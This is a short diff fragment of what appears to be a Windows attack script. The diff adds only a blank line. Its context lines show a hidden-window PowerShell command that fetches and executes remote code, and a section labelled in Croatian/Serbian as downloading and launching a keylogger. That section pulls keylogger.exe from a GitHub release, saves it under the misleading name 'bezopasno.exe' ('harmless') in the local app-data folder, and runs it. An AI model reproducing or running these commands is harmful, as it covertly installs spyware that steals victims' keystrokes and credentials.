@@ -5,6 +5,7 @@ powershell -WindowStyle Hidden -Command "IEX (IWR https://raw.githubusercontent.
 --- SKIDANJE I POKRETANJE KEYLOGGERA ---
 
 Invoke-WebRequest -Uri "https://github.com/Jango47/reverseShell/releases/download/keylogger/keylogger.exe" -OutFile "$env:LOCALAPPDATA\bezopasno.exe"
+
 & "$env:LOCALAPPDATA\bezopasno.exe"
 
 
